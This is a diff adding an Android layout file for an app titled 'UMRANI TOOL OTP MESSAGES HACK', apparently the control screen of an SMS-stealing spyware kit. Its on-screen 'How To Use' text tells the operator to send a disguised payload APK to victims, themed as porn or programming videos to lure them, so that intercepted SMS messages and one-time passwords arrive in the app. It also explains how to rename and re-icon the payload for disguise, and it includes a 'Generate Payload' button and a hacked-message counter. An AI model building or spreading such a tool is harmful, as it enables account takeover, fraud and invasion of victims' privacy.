@@ -1,0 +1,113 @@
+
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    android:background="@color/background_color"
+    android:layout_height="match_parent">
+
+    <ImageView
+        android:id="@+id/imageView"
+        android:layout_width="110dp"
+        android:layout_height="110dp"
+        android:layout_centerHorizontal="true"
+        android:background="@drawable/otpicon"
+        android:layout_marginTop="30dp"
+        android:layout_marginStart="3dp"
+        android:layout_marginEnd="30dp"
+        android:layout_marginBottom="30dp" />
+
+    <TextView
+        android:id="@+id/titleTextView"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_below="@id/imageView"
+        android:layout_centerHorizontal="true"
+        android:layout_marginBottom="16dp"
+        android:gravity="center"
+        android:text="UMRANI TOOL OTP MESSAGES HACK"
+        android:textColor="@color/text_color_header"
+        android:textSize="18sp"
+        android:textStyle="bold" />
+
+
+    <ScrollView
+
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:layout_below="@id/titleTextView"
+        android:layout_marginTop="0dp"
+        android:layout_marginBottom="16dp">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:padding="1dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_gravity="center"
+                android:layout_marginBottom="0dp"
+                android:gravity="center"
+                android:text="❗ How To Use ❗"
+                android:textColor="@color/text_color_header"
+                android:textSize="18sp"
+                android:textStyle="bold" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_gravity="center"
+                android:textStyle="bold"
+                android:shadowColor="#FF0000"
+                android:text="How to use OTP messages hack if you want to hack someone messages and OTP hack of any app , just send this payload apk to victim after victim install this MyVideos apk then you will receive new sms messages here, if victim like sex pron videos then send them Xnxxx apk and victim like Programming learning videos then send them Programming Apk in Generate Payload button i provided both apks and also you can modify payload apk with apk editor change payload apk website link, payload app name , icon.  "
+                android:textAlignment="center"
+                android:textColor="@color/text_color_header"
+                android:textSize="15sp" />
+
+            <Space
+                android:layout_width="match_parent"
+                android:layout_height="10dp" />
+
+
+            <Button
+                android:id="@+id/downloadpayload"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_gravity="center"
+                android:layout_marginBottom="16dp"
+                android:background="@drawable/rounded_corner"
+                android:text="Generate Payload APk"
+                android:textColor="@color/text_color_header"
+                android:textStyle="bold"
+                app:backgroundTint="@color/background_color_50" />
+
+            <TextView
+                android:id="@+id/totalMessagesTextView"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_below="@id/imageView"
+                android:layout_centerHorizontal="true"
+                android:layout_marginBottom="16dp"
+                android:gravity="center"
+                android:text="Total Hacked Messages: "
+                android:textColor="@color/text_color_header"
+                android:textSize="18sp"
+                android:textStyle="bold" />
+
+
+            <TextView
+                android:id="@+id/smsTextView"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_below="@id/downloadpayload"
+                android:textColor="@color/text_color_header"
+                android:layout_marginTop="16dp" />
+
+
+        </LinearLayout>
+
+    </ScrollView>
+
+</RelativeLayout>
